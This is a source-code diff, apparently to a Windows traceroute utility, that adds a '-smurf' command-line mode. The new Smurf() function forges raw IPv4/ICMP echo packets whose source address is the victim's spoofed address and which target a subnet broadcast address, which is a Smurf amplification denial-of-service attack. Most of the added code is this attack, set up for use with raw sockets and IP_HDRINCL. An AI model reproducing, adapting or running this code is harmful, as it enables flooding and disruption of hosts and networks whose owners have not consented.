@@ -19,6 +19,16 @@ struct ICMPheader
 	unsigned short	nSequence;
 };
 
+struct ICMPheader2
+{
+	unsigned char	byType;
+	unsigned char	byCode;
+	unsigned char	nChecksumH;
+	unsigned char	nChecksumL;
+	unsigned short	nId;
+	unsigned short	nSequence;
+};
+
 struct IPheader
 {
 	unsigned char	byVerLen;
@@ -37,7 +47,7 @@ using namespace std;
 
 bool Initialize();
 bool UnInitialize();
-SOCKET CreateSocket();
+SOCKET CreateSocket(int protocol);
 int SetTTL(SOCKET sock, int ttl);
 void FillHeader(ICMPheader sendHeader, char **sendBuffer);
 int SendICMP(SOCKET sock,
@@ -48,16 +58,12 @@ int SendICMP(SOCKET sock,
 	char **receiveBuffer,
 	int *received);
 int GetHostName(SOCKADDR_IN *mediatorAddress, char **hostName);
+void Smurf(int sock, struct sockaddr_in sin, u_long dest, int psize);
 
 const int MaxRetries = 3;
 
 int main(int argc, char* argv[])
 {
-	if (argc % 2 != 0)
-	{
-		return 0;
-	}
-
 	if (Initialize() == false)
 	{
 		return -1;
@@ -66,6 +72,7 @@ int main(int argc, char* argv[])
 	int sequence = 0;
 	int timeOut = 3000;
 	int maxHops = 30;
+	bool smurf = false;
 
 	char *remoteIP = NULL, *remoteHost = NULL;
 
@@ -81,6 +88,10 @@ int main(int argc, char* argv[])
 		{
 			timeOut = atoi(argv[i + 1]);
 		}
+		else if (strcmp(argv[i], "-smurf") == 0) 
+		{
+			smurf = true;
+		}
 	}
 
 	if (InetHelper::GetIP(remoteHost, &remoteIP) == false)
@@ -89,18 +100,38 @@ int main(int argc, char* argv[])
 		return -1;
 	}
 
+	SOCKADDR_IN destAddr;
+	destAddr.sin_family = AF_INET;
+	destAddr.sin_addr.S_un.S_addr = inet_addr(remoteIP);
+	destAddr.sin_port = rand();
+
+	if (smurf)
+	{
+		cout << "Smurfing " << remoteHost << endl;
+
+		SOCKET sock = CreateSocket(IPPROTO_RAW);
+
+		int brcast = 1;
+		setsockopt(sock, SOL_SOCKET, SO_BROADCAST, (char*)&brcast, sizeof(brcast));
+		int opt = 1;
+		setsockopt(sock, IPPROTO_IP, IP_HDRINCL, (char *)&opt, sizeof(opt));
+
+		int cnt = 0;
+		while (cnt++ < 1)
+		{
+			Smurf(sock, destAddr, inet_addr("192.168.1.255"), 0);
+		}
+
+		return 0;
+	}
+
 	cout << "Tracing route to " << remoteHost
 		<< " [" << remoteIP << "] over a maximum of "
 		<< maxHops << " hops." << endl << endl;
 
 	int ttl = 1;
 
-	SOCKET sock = CreateSocket();
-
-	SOCKADDR_IN destAddr;
-	destAddr.sin_family = AF_INET;
-	destAddr.sin_addr.S_un.S_addr = inet_addr(remoteIP);
-	destAddr.sin_port = rand();
+	SOCKET sock = CreateSocket(IPPROTO_ICMP);
 
 	SOCKADDR_IN mediatorAddress;
 
@@ -257,9 +288,9 @@ bool UnInitialize()
 	return true;
 }
 
-SOCKET CreateSocket()
+SOCKET CreateSocket(int protocol)
 {
-	return socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
+	return socket(AF_INET, SOCK_RAW, protocol);
 }
 
 int SetTTL(SOCKET sock, int ttl)
@@ -329,4 +360,67 @@ int SendICMP(SOCKET sock,
 int GetHostName(SOCKADDR_IN *mediatorAddress, char **hostName)
 {
 	return getnameinfo((SOCKADDR*)mediatorAddress, sizeof(SOCKADDR_IN), *hostName, NI_MAXHOST, NULL, 0, NI_NUMERICSERV);
+}
+
+typedef struct ip_hdr
+{
+	unsigned char ip_header_len : 4; // 4-bit header length (in 32-bit words)
+									 // normally=5 (Means 20 Bytes may be 24 also)
+	unsigned char ip_version : 4;   // 4-bit IPv4 version
+	unsigned char ip_tos;          // IP type of service
+	unsigned short ip_total_length; // Total length
+	unsigned short ip_id;          // Unique identifier
+
+	unsigned char ip_frag_offset : 5; // Fragment offset field
+
+	unsigned char ip_more_fragment : 1;
+	unsigned char ip_dont_fragment : 1;
+	unsigned char ip_reserved_zero : 1;
+
+	unsigned char ip_frag_offset1; //fragment offset
+
+	unsigned char ip_ttl;          // Time to live
+	unsigned char ip_protocol;     // Protocol(TCP,UDP etc)
+	unsigned short ip_checksum;    // IP checksum
+	unsigned int ip_srcaddr;       // Source address
+	unsigned int ip_destaddr;      // Source address
+} IPV4_HDR, *PIPV4_HDR, FAR * LPIPV4_HDR;
+
+void Smurf(int sock, struct sockaddr_in sin, u_long dest, int psize)
+{
+	ICMPheader2 *icmp;
+
+	IPV4_HDR *v4hdr = NULL;
+	char buf[1000];
+	int payload = 512;
+
+	v4hdr = (IPV4_HDR *)buf; //lets point to the ip header portion
+	v4hdr->ip_version = 4;
+	v4hdr->ip_header_len = 5;
+	v4hdr->ip_tos = 0;
+	v4hdr->ip_total_length = htons(sizeof(IPV4_HDR) + sizeof(ICMPheader2) + payload);
+	v4hdr->ip_id = htons(2);
+	v4hdr->ip_frag_offset = 0;
+	v4hdr->ip_frag_offset1 = 0;
+	v4hdr->ip_reserved_zero = 0;
+	v4hdr->ip_dont_fragment = 1;
+	v4hdr->ip_more_fragment = 0;
+	v4hdr->ip_ttl = 8;
+	v4hdr->ip_protocol = IPPROTO_ICMP;
+	v4hdr->ip_srcaddr = inet_addr(inet_ntoa(sin.sin_addr));
+	v4hdr->ip_destaddr = dest;
+	v4hdr->ip_checksum = 0;
+
+	icmp = (ICMPheader2 *)&buf[sizeof(IPV4_HDR)];
+	icmp->byCode = 0;
+	icmp->byType = 8;
+	icmp->nChecksumL = 8;
+	icmp->nChecksumH = 0;
+
+	char *data;
+	data = &buf[sizeof(IPV4_HDR) + sizeof(ICMPheader2)];
+	memset(data, '^', payload);
+
+	sendto(sock, buf, sizeof(IPV4_HDR) + sizeof(ICMPheader2) + payload,
+		0, (sockaddr *)&sin, sizeof(sin));
 }
